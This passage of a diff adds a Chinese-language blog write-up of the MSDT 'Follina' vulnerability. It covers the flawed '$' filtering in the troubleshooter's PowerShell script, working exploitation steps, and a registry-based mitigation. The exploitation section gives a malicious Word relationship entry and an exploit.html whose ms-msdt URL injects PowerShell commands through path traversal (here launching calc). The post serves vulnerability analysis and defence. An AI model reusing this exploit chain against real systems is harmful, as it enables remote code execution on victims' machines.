+                Set-Variable -name rebrowseText -value $CompatibilityStrings.Text_FILE_PROTECTED -scope global
+            }
+        }
+    }
+
+    Set-Variable -name appValid -value $testResult -scope global
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>从$selectedProgram提取文件名，过滤$符号，防止代码注入。由于脚本直接使用$,$实际会在过滤前被PowerShell引擎解析，所以无法起到过滤$字符的作用。</p>
+<p>正确写法应为 $appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace(“`$”, “``$”)</p>
+<pre class="line-numbers language-none"><code class="language-none">while(-not($appValid))
+{
+    $InstanceId++
+    $selection = $selectedProgram
+    $selectedProgram = Get-DiagInput -id IT_RebrowseForFile -parameter @{ "SelectedProgram" = $selection; "RebrowseText" = $rebrowseText; "Instance" = $InstanceId }
+    Set-Variable -name rebrowseText -value $CompatibilityStrings.Text_FILE_INVALID -scope global
+    Test-Selection($selectedProgram)
+}
+
+$appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace("$", "`$")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>TS最后使用Update-DiagRootCause命令，用于报告root cause的状态。会触发RS_脚本，parameter指定的字典会被作为参数传给脚本，导致第二次调用RunScript()方法，并且参数中-TargetPath可控，进而触发了漏洞。</p>
+<pre class="line-numbers language-none"><code class="language-none">if ($UpdateChoice -eq "ts_Manual")
+{
+    $Env:RecommendedLayer = $AppInfo[2]
+    Update-DiagRootCause -id "RC_IncompatibleApplication" -iid $appName -Detected $true -parameter @{ "TARGETPATH" = $selectedProgram; "APPNAME" = $appName}
+}
+else
+{
+    Start-Process -FilePath $AppInfo[1]
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>1.新建word文档，后缀更改为zip，打开后编辑/word/_regs目录下的document.xml.rels按照格式加入。</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;Relationship  Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObje ct" Target="mhtml:http://localhost:80/exploit.html!x-usc:http://localhost:80/exploit.html" TargetMode="External"/&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>2.建一个文件夹作为web站点目录，新建exploit.html文件添加（弹计算器）</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;
+location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=?
+IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(\\\\localhost\\c$\\windows\\system32\\calc)/.exe\"";
+&lt;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>IT_RebrowseForFile参数开头至少需要两次/../目录遍历</p>
+<p>包含$()中的代码会通过PowerShell执行</p>
+<p>.exe必须是IT_BrowseForFile参数末尾的最后一个字符串</p>
+<h2 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h2><p><strong>缓解方法：</strong></p>
+<p>1.禁用MSDT URL协议阻止使用漏洞的恶意攻击。</p>
+<p>2.禁用MSDT URL协议可防止故障排除应用程序作为链接启动，包括整个操作系统的链接。</p>
+<p><strong>禁用方法：</strong></p>
+<p>1.以管理员身份运行命令提示符</p>
+<p>2.备份注册表项，执行命令<code>reg export HKEY_CLASSES_ROOT\ms-msdt [filename]</code></p>
+<p>3.执行命令<code>reg delete HKEY_CLASSES_ROOT\ms-msdt</code></p>
+<p><strong>撤销禁用：</strong></p>
+<p>1.以管理员身份运行命令提示符</p>
+<p>2.恢复注册表项，执行命令“reg import [filename]”</p>
 ]]></content>
       <categories>
         <category>CVE</category>
